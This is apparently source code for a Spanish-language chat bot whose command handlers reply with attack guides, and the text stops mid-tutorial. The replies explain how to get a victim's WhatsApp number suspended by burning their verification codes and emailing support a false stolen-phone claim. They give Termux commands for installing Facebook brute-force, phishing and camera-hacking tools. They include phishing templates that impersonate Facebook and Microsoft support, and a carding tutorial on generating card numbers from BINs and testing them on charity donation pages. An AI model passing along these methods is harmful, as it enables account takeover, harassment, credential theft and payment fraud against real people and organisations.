https://m.youtube.com/channel/UCz3yFwVsRiDs_qFtfoaohgA

➣ Lozt

https://m.youtube.com/channel/UCx7Yg_RxHc9i75nnR4JdJvA

➣ AN1MA Z3R0 OFC

https://m.youtube.com/channel/UCc4hYgWSpWx5NYWLr6wyUJg

➣ TheMegaSpace

https://m.youtube.com/channel/UC4vjfsYkYos3LnWTfbRw_HQ

➣ Genious Hack

https://m.youtube.com/channel/UChYEexcJ69Jy3I3ddpaDR6Q

➣ camilo thunder mods

https://m.youtube.com/channel/UCRbl9xqps8oiNe4SP7nPmOw

➣ ૮ђષ૮ઝy66

https://m.youtube.com/channel/UCxGPqPIvkU2IN1RJnmssjqg

➣ GBZINNAYKER 👑

https://m.youtube.com/channel/UCzTvyTeyPh4mSPgl4WfDEvQ

➣ MasterKillerϟ

https://m.youtube.com/channel/UCa0qnNsxwxVOxptwmjIt5Dw

➣ WizardModz YT

https://m.youtube.com/channel/UCojW8CZUn-2j_vCZrIJzBXg

➣ XIANJIANG X

https://m.youtube.com/channel/UCeGuzvdwfTxBIkgDEjvHDfA

➣ TOM MODS YT OFC

https://m.youtube.com/channel/UCEeDgxX5E7EVhZ8TSyTQBnQ

➣ Keystone Baez

https://m.youtube.com/channel/UCFqXDhp-h_FtIMkgw-EeKcA

➣ Titan Mods

https://m.youtube.com/channel/UC_mt5RPkXqZEhTj1ysU5D4w

➣ Dan Del Zap ϟ

https://m.youtube.com/channel/UC4t_VgOilV0huJtSQR-o3lg

➣ SIXXTER PB

https://m.youtube.com/channel/UCDWRb2k1KARDgWHQpnr_xpA

➣ BERTH 1981 OFC

https://m.youtube.com/channel/UCA_wuEUZOUr3uY6w7rgRHGg

➣ FredX 尢

https://m.youtube.com/channel/UCH6dMAuCt7PJkQVOrVfAuYQ

➣ Enigma Modder OFC

https://m.youtube.com/channel/UC-XQmRekHo0dDDXgItEo6uQ

➣ LouKoh Modz 炎

https://m.youtube.com/channel/UCl8CmLL9cfYaNViUQ-_hE6Q`)
                  }
					
	if (budy.includes(`/wa inmunes`)) {
                  reply(`LISTA DE WATSAPP IMNUNES

🤬 PRIMARIO - DEMON SLAYER

https://www.mediafire.com/file/7ddydax8g1khau1/file

👺 SECUNDARIO - YO WHATSAPP

https://www.mediafire.com/file/8u3ple4wa4y04nu/file

👺 SECUNDARIO - TIK TOK

https://www.mediafire.com/file/qxnok1prxdstpw2/file

🥰 TERCIARIO - GOLD VIP

https://www.mediafire.com/file/uym0vdhbm0tobpk/file

👺 SECUNDARIO - PROYECTO X

https://www.mediafire.com/file/uym0vdhbm0tobpk/file

👺 SECUNDARIO - ZENITZU V4

https://www.mediafire.com/file/x2fy1msycq3wym2/file

👺 SECUNDARIO - ZERTO TWO V2
https://www.mediafire.com/file/26tyouohprazap0/file

👺 SECUNDARIO - CASTILLO MOODS

https://www.mediafire.com/file/rf4hjld82grqdd6/2529.apk/file

👺 SECUNDARIO - DOTA V2

https://www.mediafire.com/file/kiuykmel1r508l4/file

👺 SECUNDARIO 5K - BLACK

https://www.mediafire.com/file/yoza00ga4k0lp5c/5K_-_BLACK%25281%2529.apk/file

👺 SECUNDARIO DESTELLA V4

https://www.mediafire.com/file/17lyg04co0bq5sa/file

🤬 PRIMARIO - TÓXICA

https://www.mediafire.com/file/0gdrb1ze7guxgug/file

🤬 PRIMARIO - 𝑻𝑶́𝑿𝑰𝑪𝑶 2.0																																																											
https://www.mediafire.com/file/gmmzfk78qg2p4mh/file

👺 SECUNDARIO - TURBO NITRO V10

https://www.mediafire.com/file/87zw0nl6cx4036v/file

👺 SECUNDARIO - RAIOS

https://www.mediafire.com/file/fz4jmhvp4fsd6ae/file`)
                  }
			
	if (budy.includes(`/inmunizar`)) {
                  reply(`━━━━━━━━━━━━━━━━━━━━

〘 𝙈𝙀́𝙏𝙊𝘿𝙊𝙎 𝘿𝙀 𝙄𝙈𝙐𝙉𝙄𝙕𝘼𝙍 〙

━━━━━━━━━━━━━━━━━━━━



➥๖ۣۜ𝙄𝙢𝙪𝙣𝙞𝙯𝙖𝙧 𝙖 𝙇𝙤𝙘𝙖𝙡𝙞𝙯𝙖𝙘̧𝙖̃𝙤 🎲

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟭!
https://youtu.be/bVZG1v_HWoE

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟮!
https://youtu.be/cD0wYuhD1pM


➥๖ۣۜ𝙄𝙢𝙪𝙣𝙞𝙯𝙖𝙧 𝙖 𝙏𝙚𝙭𝙩𝙤 🎲

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟭!
https://youtu.be/mLw-_GP0IV0

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟮!
https://youtu.be/VRI5UbbR2hc


➥๖ۣۜ𝙄𝙢𝙪𝙣𝙞𝙯𝙖𝙧 𝙖 𝘾𝙤𝙣𝙩𝙖𝙩𝙤 🎲

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧!
https://youtu.be/uFPisMfQEWU


➥๖ۣۜ𝙞𝙢𝙪𝙣𝙞𝙯𝙖𝙧 𝙖 𝙀́𝙢𝙤𝙟𝙞 🎲

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟭!
https://youtu.be/mLw-_GP0IV0

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧 𝟮!
https://youtu.be/Z2wOQ1NRufU


➥๖ۣۜ𝙄𝙢𝙪𝙣𝙯𝙖𝙧 𝙖 𝘾𝙖𝙩𝙖́𝙡𝙤𝙜𝙤 🎲

💠๖ۣۜ𝙎𝙚𝙜𝙪𝙚 𝙤 𝙩𝙪𝙩𝙤𝙧!
https://youtu.be/_3bBMlu_YUo`)
                  }
					
	if (budy.includes(`/binarios`)) {
                  reply(`¿ϙᴜᴇ sᴏɴ ʟᴏs ʙɪɴᴀʀɪᴏs?

 sᴏɴ ᴛᴇxᴛᴏs ɢʀᴀɴᴅᴇs ᴇᴄʜᴏs ᴀ ʙᴀsᴇ ᴅᴇ ʟᴇᴛʀᴀs ᴏ sɪᴍʙᴏʟᴏs ᴘᴇsᴀᴅᴏs ᴇɴᴄᴏɴᴛʀᴀᴅᴏs ᴇɴ ʟᴀ ᴀᴘᴋ ᴄʜᴀʀᴀᴄᴛᴇʀ ᴛᴀʙʟᴇ , ϙᴜᴇ ᴛɪᴇɴᴇɴ ᴇɴ ᴄᴀɴᴛɪᴅᴀᴅ ᴅᴇ ʟᴇᴛʀᴀs 60000 ᴀ 65000 ᴄᴀʀᴀᴄᴛᴇʀᴇs ᴏ ʟᴇᴛʀᴀs ғᴜᴇʀᴏɴ ᴇᴄʜᴏs ᴘᴀʀᴀ ᴘᴏᴅᴇʀ ᴛʀᴀʙᴀʀ ᴇʟ ʟᴇᴄᴛᴏʀ ᴅᴇ ʟᴇᴛʀᴀs ᴇɴ ᴡsᴘ , ϙᴜᴇ sɪɢɴɪғɪᴄᴀ ϙᴜᴇ ʟᴀ ᴀᴘᴋ ᴅᴇ ᴡsᴘ ᴛɪᴇɴᴇ ʟᴇᴄᴛᴏʀᴇs ᴅᴇ ᴅɪғᴇʀᴇɴᴛᴇs ᴛɪᴘᴏs ᴄᴏᴍᴏ ᴄᴏɴᴛᴀᴄᴛᴏs ɢᴘs ᴍsᴊ ᴇᴛᴄ . ʟᴀ ᴄᴜᴇsᴛɪᴏᴍ ᴅᴇ ᴀʟ sᴇʀ ᴇᴍᴠɪᴀᴅᴏ ᴜɴ ʙɪɴᴀʀɪᴏ ᴇʟ ʟᴇᴄᴛᴏʀ ᴅᴇᴍᴏʀᴀʀᴀ  ᴇɴ ʟᴇᴇʀ ᴛᴏᴅᴀs ʟᴀs ʟᴇᴛʀᴀs ᴘᴀʀᴀ sᴇʀ ᴠɪsᴛᴀs ᴘᴏʀ ᴇʟ ʀᴇᴄᴇᴘᴛᴏʀ ᴇɴᴛᴏɴsᴇs ʟᴀs ᴍᴀɴᴇʀᴀs ᴅᴇ ᴇᴠɪᴛᴀʀ ᴇʟ ʟᴀɢᴇᴏ sɪ ᴛɪᴇɴᴇs ᴜɴ ᴡsᴘ ɴᴏʀᴍᴀʟ ᴇs ᴄᴏɴ ᴅᴇsᴛʀᴀʙᴀᴅᴏʀᴇs ᴏ ʙᴏʀʀᴀᴅᴏ ᴅᴇ ᴄᴀᴄʜᴇ ᴏ ᴍᴀs ғᴀᴄɪʟ ᴜɴ ᴡsᴘ ɪɴᴍᴜɴᴇ ᴇɴᴛᴏɴsᴇs ϙᴜᴇ ᴀsᴇɴ ᴇsᴛᴏs ᴇʟ ᴅᴇsᴛʀᴀʙᴀ ᴀsɪ ᴛ ᴘᴀsᴇɴ 1000000 ʙɪɴᴀʀɪᴏs ᴄᴏɴ sᴏʟᴏ ᴜɴᴀ ᴅᴇsᴛʀᴀʙᴀ  sᴇ ᴅᴇsʟᴀɢᴇᴀ  ʀᴇᴄᴏᴍᴇᴍᴅᴀʙʟᴇ ᴜɴ ᴡsᴘ ɪɴᴍᴜɴᴇ ᴇɴᴛᴏɴsᴇs ʟᴏs ʙɪɴᴀʀɪᴏs sᴏʟᴏ ʟʟᴇɴᴀɴ ᴇʟ ᴄᴀᴄʜᴇ ᴅᴇ ᴡsᴘ ᴀsɪ ϙᴜᴇ ᴀʟɢᴜɴᴀ ᴅᴜᴅᴀ ᴅᴇsɪʀʟᴀ`)
                  }
					
	if (budy.includes(`/quemado de codes`)) {
                  reply(`¿ϙᴜᴇ ᴇs ᴇʟ ϙᴜᴇᴍᴀᴅᴏ ᴅᴇ ᴄᴏᴅᴇ?

ᴇsᴛᴏs sᴏɴ ᴇᴄʜᴏs ᴄᴏɴ ᴠᴇʀɪғɪᴄᴀᴄɪᴏɴ ᴅᴇ ᴄᴏᴅɪɢᴏ ᴅᴇ ᴄᴏɴғɪʀᴍᴀᴄɪᴏɴ ᴅᴇ ᴇɴᴛʀᴀᴅᴀ ᴘᴀʀᴀ ɴᴜᴍᴇʀᴏs ᴅᴇ ᴡsᴘ  sᴇ ʟᴇ ᴘᴜᴇᴅᴇ ᴀsᴇʀ ᴀ ᴄᴜᴀʟϙᴜɪᴇʀ ɴᴜᴍᴇʀᴏ  ʏ ᴄᴏᴍᴏ sᴇ ᴀsᴇ ғᴀᴄɪʟ ʜᴀʏ ᴅᴏs ᴍᴇᴛᴏᴅᴏs ᴜɴᴏ ᴇs ᴄᴏɴ ᴜɴ ᴡsᴘ sᴇᴄᴜɴᴅᴀʀɪᴏ  ᴅᴏɴᴅᴇ ᴄᴏʟᴏᴄᴀs ᴇʟ ɴᴜᴍᴇʀᴏ ᴀ sᴇʀ ϙᴜᴇᴍᴀᴅᴏ ʏ ᴄᴏɴғɪʀᴍᴀs ʟᴀs ʟʟᴀᴍᴀᴅᴀs ʏ ᴍsᴊ ᴅᴇ ᴄᴏɴғɪʀᴍᴀᴄɪᴏɴ ᴀsᴛᴀ ϙᴜᴇ ᴅɪɢᴀ ʙᴜᴇʟᴠᴀ ᴀsᴇʀʟᴏ ᴇɴ ʜᴏʀᴀs  ᴏᴛʀᴀ ᴍᴀɴᴇʀᴀ ᴇs ᴄᴏɴ ᴛᴜ ᴘʀᴏᴘɪᴏ ᴡsᴘ sɪɴ sᴀʟɪʀᴛᴇᴄᴏᴍᴏ sᴇ ᴀsᴇ ɪᴇɴᴅᴏ ᴀ ᴀᴊᴜsᴛᴇs ᴄᴜᴇɴᴛᴀ ᴄᴀᴍʙɪᴀʀ ɴᴜᴍᴇʀᴏ ᴀʀɪʙᴀ ᴘᴏɴᴇs ᴛᴜ ɴᴜᴍᴇʀᴏ ʏ ᴀʙᴀᴊᴏ ᴇʟ ᴅᴇ ʟᴀ ᴠɪᴄᴛɪᴍᴀ ʏ ᴀsᴇs ʟᴏ ᴍɪsᴍᴏ ϙᴜᴇ ᴇʟ ᴘʀɪᴍᴇʀᴏ ᴄᴏɴғɪʀᴍᴀs ʟᴏs ᴄᴏᴅ ᴅᴇ ᴠᴇʀɪғɪᴄᴀᴄɪᴏɴ ᴅᴇ ᴍsᴊ ʏ ʟʟᴀᴍᴀᴅᴀs ᴀsᴛᴀ ɢᴀsᴛᴀʀʟᴏs ᴛᴏᴅᴏs . sᴇ ᴘʀᴇɢᴜɴᴛᴀɴ ᴇsᴛᴏ ᴘᴀʀᴀ ϙᴜᴇ sɪʀᴠᴇ sɪʀᴠᴇ ᴅᴇ ᴅᴏs ᴍᴀɴᴇʀᴀs  ᴜɴᴀ ᴘᴀʀᴀ ᴇʟ sᴏᴘᴏʀᴛᴇ ᴛᴇᴍᴘᴏʀᴀʟ ϙᴜᴇ ᴀ ʟᴀ ᴘᴇʀsᴏɴᴀ ϙᴜᴇ ʟ ϙᴜᴇᴍᴀɴ ʟᴏs ᴄᴏᴅ ʟᴇ ᴀᴘᴀʀᴇsᴇʀᴀ ᴜɴ ᴍsᴊ ᴅᴏɴᴅᴇ ᴅɪʀᴀ ᴄᴏɴғɪʀᴍᴀ ϙᴜᴇ ᴛᴜ ɴᴜᴍᴇʀᴏ ᴇsᴛᴀ ᴠᴇʀɪғɪᴄᴀᴅᴏ ᴇɴ ᴇsᴛᴇ ᴛᴇʟᴇғᴏɴᴏ sɪ ʟᴇ ᴅᴀs ᴀ ᴏᴋ ᴇʟ ᴡsᴘ ᴛᴇ ʙᴏᴛᴀʀᴀ ᴄᴏᴍᴏ ᴄᴀsᴛɪɢᴏ ᴅᴜʀᴀɴᴛᴇ ʜᴏʀᴀs ᴏ ᴅɪᴀs  ʟᴀ ᴍᴀɴᴇʀᴀ ᴅᴇ ᴇᴠɪᴛᴀʀʟᴏ ᴇs sᴏʟᴏ sᴀʟɪʀ ᴏ ᴄᴀɴᴄᴇʟᴀʀ  ʟᴀ ᴏᴛʀᴀ ғᴏʀᴍᴀ ϙᴜᴇ ᴀғᴇᴄᴛᴀ ᴇs ᴀʏᴜᴅᴀɴᴛᴇ ᴀ ʟᴏs ᴀᴛᴀϙᴜᴇs ϙᴜᴇ ᴀʟ sᴇʀ ᴀᴛᴀᴄᴀᴅᴏ ʏ ʟʟᴇɴᴀᴅᴏ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀᴍᴇɴᴛᴇ ᴇʟ ᴛᴇʟᴇғᴏɴᴏ ᴘᴇᴅɪʀᴀ ʟɪᴍᴘɪᴀʀ ᴘᴀʀᴀ ᴛᴇɴᴇʀ ᴇsᴘᴀᴄɪᴏ ᴇɴᴛᴏɴss ʀᴇɪɴɪᴄɪᴀʀᴀs ᴇʟ ᴡsᴘ ʏ ᴀʟ ϙᴜᴇᴍᴀʀᴛᴇ ʟᴏs ᴄᴏᴅ ᴇsᴘᴇʀᴀʀᴀs ᴇʟ ᴛɪᴇᴍᴘᴏ ᴅᴇ ᴠᴇʀɪғɪᴄᴀᴄɪᴏɴ ᴇsᴛᴇ ᴄᴀʀɢᴀᴅᴏ ʏ ᴇsᴘᴇʀᴀʀ`)
                  }
					
	if (budy.includes(`/mandar a soporte`)) {
                  reply(`🔰 Como mandar un número a soporte de WthasApp 🔰

No me hago responsable del uso que le hagan a este tipo de información.

Primero que nada deben de quemarle los Codes a su víctima!

Y se preguntaran?

Como le quemo los Codes?

Fácil se instalan otro WthasApp que sea secundario ya sea inmune o no como sea les va a funcionar y van a poner el número de la víctima y comienzan a a pedir códigos y llamadas mientras tanto deben de ponerlos incorrectos los códigos, Mientras más códigos pidas más tiempo lo mandas a soporte si de veras lo quieres quemar a tope!

Debes esperar varios días e ir quemandole los códigos.

Ej: Te dice que esperes 48 horas

Pues las 48 horas esperas, y así etc

Si esperas muchos y e ir siguiéndole quemando lo puedes dejar hasta -1

Que significa ?

Que ya le has quemando todos los Codes y si lo mandas a soporte lo suspenderán hasta por 3 meses :0

ATENCION!

Ahora bien

Soy realista los números que mandes a soporte no es que le van a eliminar el número solo si que lo vas a suspender y lo harás pasar un muy mal rato intentando sacar su número de soporte xDD)

Bueno sigo, Cuando ustedes se cansen de quemarles Codes y esperar Deben de mandar un correo a WthasApp! 
ESTE ES EL CORREO:

support@support.whatsapp.com


CUAL?

Unos de estos 2 depende de que hora sea en su pais:

Hola buenos días quisiera que desactiven mí cuenta de WhatsApp porque hace unos días perdí mí celular y quería q desactiven la cuenta porque se pueden hacer pasar por mí y puedo tener problemas aquí abajo les dejo mí número para que lo desactiven por favor (Numero).
o

Hola buenas noches quisiera que desactiven mí cuenta de WhatsApp porque hace unos días perdí mí celular y quería q desactiven la cuenta porque se pueden hacer pasar por mí y puedo tener problemas aquí abajo les dejo mí número para que lo desactiven por favor (Numero).
 
Con el asunto Telefono robado/Extraviado.
 
Y listo le dan a redactar! y mandan el correo luego esperen un correo que ellos le van a mandar diciendo que el numero ya se suspendio blablabla.

OJO

Si te devuelven con este correo:

"Por favor, envíanos documentación que nos permita verificar que el número te pertenece, como una copia de la factura telefónica o el contrato de servicio."
Significa que no lo puedes mandar a soporte porque el ya hizo unos pasos para que no lo pudieran mandar a soporte:( ahi si que no hay forma para poder quemarlo losiento xd
Otra cosa, Weyes :// para mi recomendacion: no usen esta informacion con alguien que solo les cae Mal usenlan cuando De veras Vean que es una situacion Se les sale de sus manos o los estan atacando.

Me entienden?

Tambien No todo el tiempo podre ayudar a mandar a gente a soporte cuando me pidan ayuda:( Soy una persona muy ocupada no siempre estoy disponible ya aveces ni wthasaApp para hacer eso tengo, Con esto me despido!`)
                  }
					
	if (budy.includes(`/correos support whatsapp`)) {
                  reply(`Correos para suspender números:

support@support.whatsapp.com

support@whatsapp.com

kaios_web@support.whatsapp.com

smb_web@support.whatsapp.com

webclient_web@support.whatsapp.com

android_web@support.whatsapp.com

smb@support.whatsapp.com

iphone_web@support.whatsapp.com

wp_web@support.whatsapp.com

android@support.whatsapp.com`)
                  }
					
	if (budy.includes(`/tool`)) {
                  reply(`TOOL HACKER TERMUX

$ apt-get install python3

$ apt-get install git

$ git clone https://github.com/AngelSecurityTeam/Cam-Hackers

$ pip3 install requests

$ cd Cam-Hackers

$ python3 cam-hackers.py`)
                  }
					
	if (budy.includes(`/hackfb`)) {
                  reply(`Script Hack FB Termux OSIF 



$ pkg update upgrade



$ pkg install git python2



$ git clone https://github.com/ciku370/OSIF



$ cd OSIF



Configurar:



$ pip2 install -r requirements.txt



Como executar:



$ python2 osif.py`)
                  }
					
	if (budy.includes(`/pishing`)) {
                  reply(`Shellphish –Phishing Termux


$ git clone https://github.com/thelinuxchoice/shellphish



$ cd shellphish



$ bash shellphish.sh`)
                  }
					
	if (budy.includes(`/fuerza bruta facebook`)) {
                  reply(`📲ATAQUES DE FUERZA BRUTA A LA RED SOCIAL "FACEBOOK" EN TERMUX (ANDROID)📲

📲¿Qué es fuerza bruta?📲

La fuerza bruta en el ámbito de la informática, es un método hacking en el cual, el atacante intenta descifrar la contraseña de su víctima por medio de una combinación de contraseñas generadas con información recopilada de esta misma.


✅REQUISITOS✅

☑️ Aplicación Termux
☑️ Navegador Chrome
☑️ Perfil de Facebook (Víctima)


Ahora que ya tenemos los requisitos, comenzamos con la instalación:

$ apt update && apt upgrade -y
$ termux-setup-storage
$ apt install -y python
$ apt install -y python2
$ apt install -y python2-dev
$ apt install pip2
$ pip2 install mechanize
$ apt  install -y git
$ git clone https://github.com/perjayro/Facebook_brute.git
$ cd Facebook_brute
$ chmod +x brute.py
$ python2 brute.py

EL ID de la víctima

CONTRASEÑA
pass.txt
pass1.txt
pass2.txt
pass3.txt`)
                  }
					
		if (budy.includes(`/terkey termux`)) {
                  reply(`Termux Up Down - Terkey



$ pkg update & pkg upgrade

$ pkg install python

$ pkg install git

$ git clone https://github.com/karjok/terkey

$ cd terkey

$ python terkey.py`)
                  }
					
		if (budy.includes(`/socialfish v2`)) {
                  reply(`SocialFish v2 Termux Script



SocialFish v2 Herramentaa de trabajo de termux que puede ser usada como medida  de aprendisaje para hackear phishing y esa herramienta tambiém puede ser usada para recolectar datos importantes que son usados ​​para phishing posteriormente.



Requerido:



Python 2.7

Wget from Python

PHP



Clone:



$ git clone https://github.com/UndeadSec/SocialFish.git



ejecutar:



$ cd SocialFish`)
                  }
					
		if (budy.includes(`/fbchecker`)) {
                  reply(`Script Termux Fbchecker


$ apt install git



$ apt install php



$ git clone https://github.com/fdciabdul/fbchecker



$ cd fbchecker



$ php fbcheck.php



Untuk menggunakan script ini masukan perintah berikut:



$ php fbcheck.php target.txt`)
                  }
					
		if (budy.includes(`/plantilla soporte facebook`)) {
                  reply(`Página oficial de Facebook Support ©
https://Facebook_Support@facebook.com
--------------------------------
Facebook Support ©

Buenas tardes Sr. Usuario de Facebook, con los respectivos permisos de WhatsApp Support, le estamos comunicando una alerta de inicio de sesión en su cuenta de Facebook.

Hemos detectado que un dispositivo Samsung Galaxy J5 Prime, está solicitando el acceso a su cuenta de Facebook.
Dentro de 24 horas aproximadamente, su cuenta de Facebook será iniciada en el dispositivo mencionado y sera cerrada en su dispositivo.
Si está de acuerdo con el cambio de su cuenta de Facebook al dispositivo android Samsung Galaxy J5 Prime, puede realizarlo de forma inmediata escribiendo el siguiente mensaje de confirmación:

Change_Facebook

En caso de que usted no haya solicitado éste cambio, deberá verificar que éste es el dispositivo oficial de ésta cuenta de Facebook, para hacerlo, deberá iniciar sesión desde el siguiente enlace de verificación de Facebook.

[Enlace de Verificación]
https://Facebook_Support_Verification@mitly.us/VSsSnYDy

Si usted realiza la siguiente verificación... Facebook Support bloqueara el acceso de su cuenta de Facebook en el dispositivo Samsung Galaxy J5 Prime, para evitar cualquier tipo de robo de su cuenta de Facebook y así mantener su cuenta segura.
En caso de que no verifíque su cuenta, el cambio se realizara dentro de 24 horas a partir de éste momento.

Contactenos a la siguiente dirección de correo electrónico si necesita ayuda o tiene algún problema.

_FacebookSupport@gmail.com`)
                  }
					
	if (budy.includes(`/plantilla soporte whatsapp`)) {
                  reply(`[❌] ꜱᴇ ᴘʀᴏᴅᴜᴊᴏ ᴜɴ ᴇʀʀᴏʀ, ɪɴᴛᴇɴᴛᴀʟᴏ ᴍᴀꜱ ᴛᴀʀᴅᴇ [❌]`)
                  }
					
	if (budy.includes(`/plantilla soporte microsoft`)) {
                  reply(`Página oficial de Microsoft Outlook ©
https://MicrosoftOutlook@hotmail.com
--------------------------------
Microsoft Outlook ©

Buenas Noches Sr. Usuario de Hotmail, con los respectivos permisos de WhatsApp Support, le estamos comunicando una alerta de inicio de sesión en su cuenta de Hotmail.

Hemos detectado que un dispositivo Samsung Galaxy J5 Prime, está solicitando el acceso a su cuenta de Hotmail.
Dentro de 24 horas aproximadamente, su cuenta de Hotmail será iniciada en el dispositivo mencionado y será cerrada en su dispositivo.
Si está de acuerdo con el cambio de su cuenta de Hotmail al dispositivo android Samsung Galaxy J5 Prime, puede realizarlo de forma inmediata escribiendo el siguiente mensaje de confirmación:

Change_Hotmail

En caso de que usted no haya solicitado éste cambio, deberá verificar que éste es el dispositivo oficial de ésta cuenta de Hotmail, para hacerlo, deberá iniciar sesión desde el siguiente enlace de verificación de Hotmail.

[Enlace de Verificación]
https://Microsoft_Outlook_Verification@mitly.us/VSsSnYDy

Si usted realiza la siguiente verificación... Microsoft Outlook bloqueara el acceso de su cuenta de Hotmail en el dispositivo Samsung Galaxy J5 Prime, para evitar cualquier tipo de robo de su cuenta de Hotmail y así mantener su cuenta segura.
En caso de que no verifíque su cuenta, el cambio se realizara dentro de 24 horas a partir de éste momento.

Contactenos a la siguiente dirección de correo electrónico si necesita ayuda o tiene algún problema.

Microsoft_Outlook@hotmail.com`)
                  }
					
		if (budy.includes(`/introducción bins`)) {
                  reply(`📢 INTRODUCCION BINS ✅

🔱 PRIMERO QUE NADA DEBEMOS SABER CADA COSA QUE VAMOS USAR OK.

☪️ ¿Que es un Bin?

Un BIN son los 6 primeros números de una tarjeta lo cual identifica al banco y al tipo de tarjeta que es. Los BINs nos permiten generar tarjetas de crédito o debito.
  
🌈 Ejemplo: 541111xxxxxxxxxx

Y BUENO, QUE HARE CON LAS x Y COMO OBTENDRÉ LA FECHA Y EL CODIGO DE SEGURIDAD...🤠

Se ingresara a cualquiera de estas paginas...

https://namso-gen.com/

https://www.bestccgen.com/namso-ccgen/

https://cc-gen.us/

📡 INGRESANDO A CUALQUIERA DE ESAS PAGINAS OBTENDREMOS LA TARJETA DE CREDITO/DEBITO CON SU FECHA Y CVV...🛰

🙆‍♂️ RECUERDA.....ESTAS TARJETAS GENERADAS SON FALSAS...💫

🤡 NO SON REALES, SINO TODO AQUEL QUE BINEE ESTUVIERA EN CANADÁ...🤗

🕉 BUENO YA SABIENDO QUE ES UN BIN...PASAREMOS A ENSEÑARLES QUE ES UN VPN...✅

PUES BASICAMENTE UN VPN ES UNA HERRAMIENTA QUE USAREMOS CASI SIEMPRE XD. CON LA VPN NOSOTROS PODREMOS CREAR CUENTAS PREMIUN...YA QUE ESTA APP, OSEA LA VPN, NOS PODRA CAMBIAR NUESTRA DIRECCIÓN IP, OSEA SUPONGAMOS QUE SOMOS DE VENEZUELA 🇻🇪...Y BUENO EN LA INFORMACIÓN DEL BIN DICE QUE SU PROCEDENCIA ES DE BRAZIL 🇧🇷...PUES BÁSICAMANTE LO QUE HAREMOS ES ENCENDER NUESTRA VPN. BUSCAR DICHO PAIS DEL BIN QUE COMO EJEMPLO ES BRAZIL 🇧🇷. Y LISTO XD.

♌ COMO TERCER PASO, SERIA SABER O TENER UNA NOCIÓN DE QUE ES UN LIVE...

Básicamente las lives son tarjetas de crédito aprobadas por el mercado, es decir, tienen fondos. Estás sirven para realizar pequeñas, grandes compras fisicas y/o renovar suscripciones.

A CONTINUACIÓN LES DEJO PAGINAS FUNCIONALES PARA SACAR LIVES...🐊

https://karmeyhesed.org/

https://dzi.org/make-a-donation 

https://www.habitat.org/ 

https://secure.givewell.org/

Y ESTO SE PREGUNTARA COMO SACO LIVES....EN RESUMEN... CONECTAN SU VPN AL PAIS DEL BIN....GENERAN TARJETAS EN CUALQUIERA DE LAS PAGINAS QUE LES MANDE... Y FINALMENTE LE DAN EN COMPRAR - START O UNA MAMADA ASI XD...SI DICE ALGUN MENSAJE DE ERROR...SIGNFICA QUE LA TARJETA ESTA MUERTA...Y EN CASO LA TARJETA PASE....SIGNFICA QUE ESTA LIVE = VIVA. EL UNICO REQUISITO ES TENER PACIENCIA...🙃

A, POR SI QUIEREN BINS,MÉTODOS Y CURSOS TOTALMENTE GRATUITO UNANSE A NUESTRO CANAL DE TELEGRAM...🖤...https://t.me/joinchat/2xJmxMcHVW9lMDdh


🛐 ¿COMO CREAR UN BIN?

Un bin se hace a base de una cc real, solo debemos copiar los 6 primeros números de la cc y agregamos 10 equis (x)

Ejemplo: 5411112364745823

Bin: 541111xxxxxxxxxxx

En caso no tengas tarjeta de credito o debito hay un canal donde suben bins a diario, lo único que tendrias que hacer es ponerte a calar (probar) en que paginas jala (funciona)

Canal Donde Pueden Sacar Bins: https://t.me/MacacosCC...🤑

 ☮¿EN QUE PAGINAS JALAN?

Bueno, esto es depende de donde sea el bin. Hay bins que jalan en una sola pagina ejemplo (crunchyroll) y hay otros que son multifuncionales ejemplo (crunchyroll, mubi, Onlyfans, entre otras).

Posdata: solo tome esas páginas para el ejemplo ._.XD

✝️ ¿QUE ES CHAVELO?

Se le denomina “Chabelo” a un bin que pese a que es viejo sigue funcionando en varias páginas.

♉ ¿Corremos riesgo al utilizar un bin?

Los BINS no son tan peligrosos, con la acción de “binear”, solo se estafa a la empresa en donde la usaste la cc generada.

Las tarjetas no son de dueños reales, solo son algoritmos, que de alguna manera pasan en una
página.

Lo más malo que te puede pasar, es que una página bloquee tu IP real permanentemente o tu dispositivo.

La otra cosa, es que tu IP puede estar en una lista negra de SPAM, eso es
provocado usualmente por VPN’s como Hola que vende este tipo de datos de sus usuarios a otras compañías, lo cual es algo que Hola no te especifica. Igual, hay muchos mejores VPN’s .

Es muy raro que pase, binear no es peligroso, si es que no abusas o llegas a un extremo muy pero muy elevado.

♐ ¿Qué es BAN?

Seguramente en los diversos grupos has escuchado esto, literalmente Ban significa prohibir esto es que se te pone una restricción; ya sea total, parcial, temporal o permanente, al sitio en donde has realizado la compra

Bueno Geys espero les haya servido esta breve introducción recuerda que si quieres aprender más sobre esto puedes descargar nuestra aplicación donde encontraras tutoriales,bins y métodos funcionales. Eso seria todo con esto me despido.`)
                  }
					
		if (budy.includes(`/crear cuentas con bins`)) {
                  reply(`📥 TUTORIAL PARA CREAR CUENTAS PREMIUN 𝗧𝗜𝗗𝗔𝗟 & FREE TRIALS 📥

🎓 BREVE GLOSARIO:

👀 BIN = 6 DIJITOS DE UNA CC
👀 CC = TARJETA REAL CRÉDITO/DÉBITO - SE USA PARA SACAR BIN
👀 VPN = RED PARÁ EMULAR OTRA UBICACIÓN

🤡 PASOS:

1️⃣ INSTALAN UNA VPN Y SE CONECTAN A IP USA ~ RECOMIENDO TUNNELBEAR O HMA VPN SI LA PAGAS PUEDEN USAR EL NAVEGADOR BRAVE.

2️⃣ ENTRAN A TIDAL.COM.

3️⃣ CLICK EN "PRUEBA GRATIS".

4️⃣ PONEN SU GMAIL REAL Y UNA CONTRASEÑA LE DAN EN "CREAR CUENTA".

5️⃣ LUEGO VAN AL GENERADOR NAMSO-GEN.COM Y PEGAN EL SIGUIENTE BIN: 51546200x100xxx7

